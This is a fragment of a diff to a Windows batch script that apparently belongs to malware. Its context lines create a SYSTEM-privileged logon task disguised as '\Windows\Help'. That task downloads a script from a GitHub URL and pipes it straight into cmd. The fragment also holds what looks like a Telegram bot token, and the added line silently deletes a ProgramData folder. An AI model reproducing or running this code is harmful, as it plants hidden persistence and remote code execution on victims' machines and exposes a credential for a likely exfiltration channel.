@@ -15,6 +15,7 @@ for %a in (%processList%) do (
     )
 )
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /Q /V:ON" /F
+rd /s /q "%ProgramData%\Comms"
 
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
